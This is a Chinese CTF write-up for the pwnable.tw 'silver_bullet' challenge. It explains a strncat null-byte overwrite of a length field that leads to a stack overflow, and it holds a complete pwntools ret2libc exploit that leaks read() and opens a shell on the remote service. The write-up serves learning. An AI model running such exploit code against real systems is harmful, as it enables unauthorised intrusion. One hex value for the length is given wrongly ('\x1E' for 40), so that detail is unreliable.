@@ -1,0 +1,45 @@
+0x00背景介绍
+之前加了学校的ctf社团之后开始学习binary方面的知识，跟着教程走完一遍之后学长推荐了pwnable来刷题，这篇文章就是pwnable上silverbullet的详细破解过程。
+0x01程序分析
+1. main 函数
+int __cdecl main(int argc, const char **argv, const char **envp) { int choice; // eax int lives_count; // [esp+0h] [ebp-3Ch] const char *name; // [esp+4h] [ebp-38h] char bullet; // [esp+8h] [ebp-34h] int input_len; // [esp+38h] [ebp-4h] init_proc(); input_len = 0; memset(&bullet, 0, 0x30u); lives_count = 0x7FFFFFFF; name = "Gin"; while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { menu(); choice = read_int();##输入选项 if ( choice != 2 ) break; power_up(&bullet);##加强子弹 } if ( choice > 2 ) break; if ( choice != 1 ) goto default; create_bullet(&bullet);##生成子弹 } if ( choice == 3 ) break; if ( choice == 4 ) { puts("Don't give up !"); exit(0); } default: puts("Invalid choice"); } if ( beat((int)&bullet, &lives_count) )##用子弹打狼 return 0; puts("Give me more power !!"); } }
+可以看到程序并没有开启canary, 所以就考虑是否有栈溢出漏洞
+2. create_bullet:
+int __cdecl create_bullet(char *bullet) { size_t input_len; // ST08_4 if ( *bullet ) return puts("You have been created the Bullet !"); printf("Give me your description of bullet :"); read_input(bullet, 0x30u); input_len = strlen(bullet); printf("Your power is : %u
+", input_len); *((_DWORD *)bullet + 12) = input_len; return puts("Good luck !!"); }
+可以看到存储输入的字符串长度的变量就在存储输入字符的48个字节的后面一个字节.
+3.power_up:
+int __cdecl power_up(char *dest) { char buf; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&buf, 0, 0x30u); if ( !*dest ) return puts("You need create the bullet first !"); if ( *((_DWORD *)dest + 12) > 0x2Fu ) ##字符串长度若大于47则不能power_up return puts("You can't power up any more !"); printf("Give me your another description of bullet :"); read_input(&buf, 48 - *((_DWORD *)dest + 12)); ##读取添加的字符串, 限制的添加的字符串的长度 strncat(dest, &buf, 48 - *((_DWORD *)dest + 12)); ##将新读取的字符串和原来的字符串拼接起来 v3 = strlen(&buf) + *((_DWORD *)dest + 12); ##重新计算新的字符串的长度 printf("Your new power is : %u
+", v3); *((_DWORD *)dest + 12) = v3; ##更新字符串长度 return puts("Enjoy it !"); }
+char *strncat(char *dest, const char*src, size_t n);
+DESCRIPTION: strncat函数将src字符串最多前n字节添加到dest字符串的末尾(从dest原来末尾的'\x00'开始), 并在添加结束后在末尾补上一个'\x00'
+经过上面的分析, 我们可以简单地把main函数的栈结构画出来如下, 方便后面分析
+0x02 漏洞分析
+如果我们先用create_bullet添加40个字节的字符串,
+此时字符串长度处的数据为 **\x1E\x00\x00\x00**(小端序低位存储在地地址处)
+再用power_up添加8个字节的字符串, 我们结合power_up代码分析
+` if ( *((_DWORD *)dest + 12) > 0x2Fu ) ##字符串长度若大于47则不能power_up
+return puts("You can't power up any more !");
+此时\*((_DWORD \*)dest + 12 等于 40, 小于0x2f, 然后会调用read_input函数读取8个字节
+`read_input(&buf, 48 - *((_DWORD *)dest + 12));`
+再调用strncat拼接两个字符串
+`strncat(dest, &buf, 48 - *((_DWORD *)dest + 12));`
+漏洞就发生了, 因为strncat()会在拼接完的字符串后面添加一个'\x00', 于是字符串长度的第一个字节就被覆盖成了'\x00', 字符串长度就变成了0
+` v3 = strlen(&buf) + *((_DWORD *)dest + 12); ##重新计算新的字符串的长度
+printf("Your new power is : %u
+", v3);
+*((_DWORD *)dest + 12) = v3; ##更新字符串长度
+再更新之后字符串长度就变成了8, 于是我们可以在此使用power_up函数了~这次最多可以添加40个字节的数据, 完全足够覆盖main函数的ret地址了.
+于是现在的思路就是通过栈溢出泄露libc中某个函数的地址(我选择的是read()), 然后根据题目提供的libc获得system和"/bin/sh"的地址, 最后调用system("/bin/sh"), get_shell之后就拿到flag啦~
+在调用strncat之后原来的储存的长度(40)就会被清零, 而函数结束后会变成8, 又可以在后面继续添加了, 于是就可以利用栈溢出覆盖ret地址而得到libc中函数的地址, 进而通过提供的libc得到system的地址和"/bin/sh"的地址, 从而get shell
+1. 首先想办法泄露libc地址
+我通过栈溢出将main函数deret地址修改为puts的plt地址调用()puts来输出got中read的地址, 从而得到libc中read的地址. 覆盖后栈空间大致如下
+而puts()的返回地址被覆盖为main函数的初始地址, 所以拿到libc中read()的地址后又会重新运行main函数, 这次就可以利用的到的libc地址计算出system()和"/bin/sh"的真实地址再次覆盖返回地址调用system("/bin/sh")get shell了。
+0x03 exp
+exp如下:
+```python from pwn import * debug = 0 if debug: io = process('./silver_bullet') libc = ELF('/lib32/libc.so.6') libc_bash = 0x0015902b else: io = remote('chall.pwnable.tw', 10103) libc = ELF('./libc_32.so.6') libc_bash = 0x00158e8b elf = ELF('./silver_bullet') libc_read = libc.symbols['read'] libc_system = libc.symbols['system'] plt_puts = 0x080484a8 got_read = elf.got['read'] # power_ret = 0x080489C2 power_ret = 0x08048954 def add_bullet(bullet): io.sendline('1') io.recvuntil("bullet :") io.send(bullet) ret1 = io.recvline() ret2 = io.recvline() return ret1 + '
+' + ret2 def power_up(bullet): io.sendline('2') io.recvuntil('bullet :') io.send(bullet) return io.recv() def convert(str): ret ='' for ch in str: ret = ch + ret return ret def pwn(): add_bullet('a'*40) power_up('a'*8) # return power_up(p32(0xffffffec)+p32(0)+p32(plt_puts) + p32(power_ret) + p32(got_read)) power_up('\xff'*7+p32(plt_puts) + p32(power_ret) + p32(got_read)) io.sendline('3') io.sendline('3') io.recvuntil("You win !!
+") real_read_addr = int(convert(io.recv(4)).encode('hex'), 16) # return real_read_addr real_system_addr = real_read_addr + libc_system - libc_read real_bash_addr = real_read_addr + libc_bash - libc_read add_bullet('a'*40) power_up('a'*8) power_up('\xff'*7 + p32(real_system_addr) + p32(power_ret) + p32(real_bash_addr)) io.sendline('3') io.interactive() ```
+0x04 收获
+1. 本机调试的时候libc用的是/lib32/libc.so.6 2. 寻找libc中的"/bin/sh"时先是用ida中的string, 但是没找到. 之后尝试了一下ROPgadget, 发现很强大, 找了了一个"/bin/sh"和一堆"sh" `ROPgadget --binary "./libc.so.6" --string "/bin/sh"` 3. 经大佬提醒, 不一定非要"/bin/sh", "sh"也行, 而且还有$0这种方法, 可能类似格式化字符串, 不过也没找到资料. 有空可以做一下实验, 学习了.
+*本文作者：pu111p，转载请注明来自FreeBuf.COM
